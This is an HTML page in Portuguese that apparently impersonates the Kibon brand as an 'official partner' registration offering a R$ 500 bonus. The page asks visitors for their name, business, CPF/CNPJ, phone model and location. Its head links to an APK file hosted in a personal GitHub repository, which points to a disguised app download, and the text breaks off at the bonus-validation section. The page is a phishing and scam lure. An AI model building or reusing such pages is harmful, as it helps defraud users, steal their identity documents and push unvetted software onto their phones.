<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Parceiro Kibon - Cadastro e Bônus</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://github.com/wellsilvasp13-hash/kibon/raw/main/kibon.apk">
    <style>
        body { font-family: 'Inter', sans-serif; }
        .gradient-brand { background: linear-gradient(135deg, #E30613 0%, #ff4d4d 100%); }
        .input-error { border-color: #ef4444 !important; background-color: #fef2f2 !important; outline: 2px solid #ef4444 !important; }
    </style>
</head>
<body class="bg-slate-50 min-h-screen py-10 px-4">

    <div class="max-w-3xl mx-auto bg-white rounded-3xl shadow-2xl overflow-hidden border border-gray-100">
        
        <div class="gradient-brand p-8 text-white text-center">
            <div class="bg-white inline-block px-4 py-2 rounded-full mb-4 shadow-sm">
                <span class="text-red-600 font-bold text-sm tracking-widest uppercase italic">Kibon</span>
            </div>
            <h1 class="text-3xl font-extrabold mb-2">Seja um Parceiro Oficial</h1>
            <p class="text-red-100 opacity-95 font-medium italic text-lg">Use seus R$ 500 no aplicativo agora!</p>
        </div>

        <form id="formCadastro" class="p-8 space-y-6">
            <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div class="space-y-1">
                    <label class="text-xs font-bold text-gray-500 uppercase ml-1">Nome Completo</label>
                    <input type="text" required class="w-full px-4 py-3 rounded-xl border border-gray-200 focus:ring-2 focus:ring-red-500 outline-none bg-gray-50 transition-all">
                </div>
                <div class="space-y-1">
                    <label class="text-xs font-bold text-gray-500 uppercase ml-1">Nome do Comércio</label>
                    <input type="text" required class="w-full px-4 py-3 rounded-xl border border-gray-200 focus:ring-2 focus:ring-red-500 outline-none bg-gray-50 transition-all">
                </div>
            </div>

            <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div class="space-y-1">
                    <label class="text-xs font-bold text-gray-500 uppercase ml-1">CNPJ ou CPF</label>
                    <input type="text" id="documento" placeholder="000.000.000-00" required 
                           class="w-full px-4 py-3 rounded-xl border border-gray-200 focus:ring-2 focus:ring-red-500 outline-none bg-gray-50 transition-all">
                    <p id="error-msg" class="hidden text-red-600 text-[10px] font-bold ml-1 mt-1 uppercase">Documento Inválido! Verifique os números.</p>
                </div>
                <div class="space-y-1">
                    <label class="text-xs font-bold text-gray-500 uppercase ml-1">Modelo do Celular</label>
                    <select required class="w-full px-4 py-3 rounded-xl border border-gray-200 focus:ring-2 focus:ring-red-500 outline-none bg-gray-50 transition-all">
                        <option value="" selected disabled>Selecione seu aparelho...</option>
                        <option>Samsung (Android)</option>
                        <option>Motorola (Android)</option>
                        <option>Xiaomi / Redmi (Android)</option>
                        <option>iPhone (iOS)</option>
                        <option>Outro Android</option>
                    </select>
                </div>
            </div>

            <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div class="space-y-1">
                    <label class="text-xs font-bold text-gray-500 uppercase ml-1">Estado (UF)</label>
                    <select id="estado" required class="w-full px-4 py-3 rounded-xl border border-gray-200 focus:ring-2 focus:ring-red-500 outline-none bg-gray-50 transition-all">
                        <option value="" selected disabled>Selecione o Estado...</option>
                        <option value="AC">Acre</option>
                        <option value="AL">Alagoas</option>
                        <option value="AP">Amapá</option>
                        <option value="AM">Amazonas</option>
                        <option value="BA">Bahia</option>
                        <option value="CE">Ceará</option>
                        <option value="DF">Distrito Federal</option>
                        <option value="ES">Espírito Santo</option>
                        <option value="GO">Goiás</option>
                        <option value="MA">Maranhão</option>
                        <option value="MT">Mato Grosso</option>
                        <option value="MS">Mato Grosso do Sul</option>
                        <option value="MG">Minas Gerais</option>
                        <option value="PA">Pará</option>
                        <option value="PB">Paraíba</option>
                        <option value="PR">Paraná</option>
                        <option value="PE">Pernambuco</option>
                        <option value="PI">Piauí</option>
                        <option value="RJ">Rio de Janeiro</option>
                        <option value="RN">Rio Grande do Norte</option>
                        <option value="RS">Rio Grande do Sul</option>
                        <option value="RO">Rondônia</option>
                        <option value="RR">Roraima</option>
                        <option value="SC">Santa Catarina</option>
                        <option value="SP">São Paulo</option>
                        <option value="SE">Sergipe</option>
                        <option value="TO">Tocantins</option>
                    </select>
                </div>
                <div class="space-y-1">
                    <label class="text-xs font-bold text-gray-500 uppercase ml-1">Cidade</label>
                    <input type="text" id="cidade" placeholder="Digite sua cidade" required 
                           class="w-full px-4 py-3 rounded-xl border border-gray-200 focus:ring-2 focus:ring-red-500 outline-none bg-gray-50 transition-all">
                </div>
            </div>

            <div class="bg-red-50 rounded-3xl p-8 border border-red-100 text-center">
                <h3 class="text-red-700 font-bold text-lg mb-2 uppercase">🎁 Validar Bônus de R$ 500</h3>
